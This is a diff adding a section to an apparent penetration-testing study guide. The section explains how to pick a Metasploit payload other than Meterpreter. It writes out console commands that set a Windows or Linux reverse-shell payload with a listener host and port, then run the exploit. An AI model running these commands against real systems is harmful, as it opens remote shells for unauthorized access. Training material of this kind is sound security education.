@@ -54,6 +54,16 @@ Why "encrypted channel" is a real distinction: a plain reverse shell (the kind [
 
 → A defender sniffing this sees the secret in plain text. Meterpreter's TLS channel would show ciphertext instead — that's the "quieter C2" advantage in one picture.
 
+### Assign a payload OTHER than meterpreter (JQR)
+The guide asks you to *select and assign a payload other than meterpreter*. It's the same `set payload` command — just point it at a `shell/...` path instead of `meterpreter/...`. After `use <exploit>`:
+```text
+show payloads                                 # list the payloads valid for THIS exploit
+set payload windows/x64/shell/reverse_tcp     # a plain reverse SHELL (staged, not meterpreter)
+set payload windows/x64/shell_reverse_tcp     # stageless variant (one blob, note the _)
+set LHOST 192.168.1.10 ; set LPORT 4444 ; run
+```
+→ Linux target equivalent: `set payload linux/x64/shell/reverse_tcp`. You now catch a raw OS shell instead of a Meterpreter session — smaller and more portable, but none of the built-in verbs below.
+
 ### Staged vs stageless, reverse vs bind
 
 The payload name encodes three choices:
